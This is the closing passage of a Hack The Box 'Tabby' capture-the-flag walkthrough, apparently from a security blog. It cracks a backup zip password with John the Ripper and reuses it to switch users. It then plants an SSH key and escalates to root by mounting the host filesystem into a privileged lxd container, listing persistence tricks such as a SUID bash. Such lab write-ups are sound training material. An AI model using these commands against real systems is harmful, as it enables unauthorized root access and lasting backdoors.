</code></pre></div><h4 id="recover-backup-password">Recover Backup Password</h4>
<p>The backup file is protected by a password. I&rsquo;ll try to recover the password using John the Ripper from my Windows machine, but first I&rsquo;ll have to convert it to hash format using <code>zip2john</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «tabby» «10.10.14.30»
$ zip2john 16162020_backup.zip &gt; backup.hash
</code></pre></div><p>The password got cracked instantly.</p>
<pre><code>john.exe --wordlist=rockyou.txt backup.hash
</code></pre><p><div class="img-container"><img src="imgs/3538b21b4a734a6981f21967db4e87fa.png" alt="3538b21b4a734a6981f21967db4e87fa"  /></div>
</p>
<p>The password is <code>admin@it</code>.</p>
<h4 id="su---ash">SU - ash</h4>
<p>It turns out that the backup password is reused by <code>ash</code></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">tomcat@tabby:/$ su ash
su ash
Password: admin@it
</code></pre></div><p>I&rsquo;ll put my SSH public key to the authorized_keys file on <code>ash</code> home directory for better shell.</p>
<pre><code>ash@tabby:~/.ssh$ echo 'ssh-rsa AAAAB3NzaC1y....H/y1qmY6ipsfAec=' &gt; authorized_keys
</code></pre><p>Now I can login with my key.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «tabby» «10.10.14.30»
$ ssh -i id_rsa ash@10.10.10.194
ash@tabby:~$                                                                 
ash@tabby:~$ sudo -l
<span style="color:#f92672">[</span>sudo<span style="color:#f92672">]</span> password <span style="color:#66d9ef">for</span> ash:                                                                   
Sorry, user ash may not run sudo on tabby.
ash@tabby:~$ id
uid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>ash<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>ash<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>ash<span style="color:#f92672">)</span>,4<span style="color:#f92672">(</span>adm<span style="color:#f92672">)</span>,24<span style="color:#f92672">(</span>cdrom<span style="color:#f92672">)</span>,30<span style="color:#f92672">(</span>dip<span style="color:#f92672">)</span>,46<span style="color:#f92672">(</span>plugdev<span style="color:#f92672">)</span>,116<span style="color:#f92672">(</span>lxd<span style="color:#f92672">)</span>
</code></pre></div><h3 id="shell-as-root">Shell as root</h3>
<h4 id="abusing-lxc">Abusing lxc</h4>
<p>I found out that user <code>ash</code> is a member of the <code>lxd</code> group. This group can be abused by mounting the whole root file system into a container, and then I can access it freely from inside the container.</p>
<blockquote>
<p>It holds the same concept as Hack The Box - Cache (on progress..) that uses docker for the root part by mounting <code>/</code> (root file system) to the container and interacting with it from inside the container as a privileged user.</p>
</blockquote>
<p>I&rsquo;ll use <a href="https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation">this</a> article as reference.</p>
<p>First, I’ll create an alpine image on my attacking machine, which is Kali Linux.</p>
<pre><code>→ root@iamf «tabby» «10.10.14.30»
$ git clone https://github.com/saghul/lxd-alpine-builder

→ root@iamf «tabby» «10.10.14.30»
$ cd lxd-alpine-builder

→ root@iamf «tabby» «10.10.14.30»
$ ./build-alpine
</code></pre><p><div class="img-container"><img src="imgs/99679b825f584f4aaefa3412876cd211.png" alt="99679b825f584f4aaefa3412876cd211"  /></div>
</p>
<p>Once it&rsquo;s done, there will be an image file called <code>alpine-v3.12-x86_64-blablabla</code>. In my case, it is <code>alpine-v3.12-x86_64-20201107_1900.tar.gz</code>. I&rsquo;ll send the image to Tabby via <code>scp</code>.</p>
<pre><code>→ root@iamf «tabby» «10.10.14.30»
$ scp -i id_rsa alpine-v3.12-x86_64-20201107_1900.tar.gz  ash@10.10.10.194:/tmp
</code></pre><p>I&rsquo;ll initialize the lxd (storage pool, profile, etc..).</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ash@tabby:~$ lxd init
</code></pre></div><p>I&rsquo;ll import the image, and then initialize the image.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ash@tabby:~$ lxc image import /tmp/alpine-v3.12-x86_64-20201107_1900.tar.gz --alias iamf-img
ash@tabby:~$
ash@tabby:~$ lxc init iamf-img img-container -c security.privileged<span style="color:#f92672">=</span>true
</code></pre></div><p>Next, I&rsquo;ll mount the root file system of the host to the container at <code>/mnt/root</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ash@tabby:~$ lxc config device add img-container iamf-test disk source<span style="color:#f92672">=</span>/ path<span style="color:#f92672">=</span>/mnt/root
Device iamf-test added to img-container
</code></pre></div><p>After that, I&rsquo;ll start the container. I can confirm it is running using <code>lxc ls</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ash@tabby:~$ lxc start img-container
</code></pre></div><p><div class="img-container"><img src="imgs/image-20210427003512685.png" alt="image-20210427003512685"  /></div>
</p>
<p>Now I can just interact with the container and grab the root flag on <code>/mnt/root/root/root.txt</code></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ash@tabby:~$lxc exec img-container /bin/sh
</code></pre></div><p><div class="img-container"><img src="imgs/image-20210427003902623.png" alt="image-20210427003902623"  /></div>
</p>
<p>Modifications on <code>/mnt/root/</code> will also affect the root file system of the host. Other things I can do from the container is:</p>
<ul>
<li>Adding a persistent user via <code>/etc/passwd</code> (<code>/mnt/root/etc/passwd</code>)</li>
<li>Adding a SUID bash (<code>cp bash /mnt/root/dev/shm/bash; chmod 4755 /mnt/root/dev/shm/bash</code>)</li>
<li>Enabling root login and put my SSH public key to the root <code>authorized_keys</code> file.</li>
</ul>
<hr>
<h2 id="references">References</h2>
<ul>
<li><a href="https://blog.techstacks.com/2010/07/new-manager-roles-in-tomcat-7-are-wonderful.html">https://blog.techstacks.com/2010/07/new-manager-roles-in-tomcat-7-are-wonderful.html</a></li>
<li><a href="https://book.hacktricks.xyz/pentesting/pentesting-web/tomcat">https://book.hacktricks.xyz/pentesting/pentesting-web/tomcat</a></li>
<li><a href="https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation">https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation</a></li>
</ul>
]]></content:encoded>
    </item>
    
  </channel>
</rss>
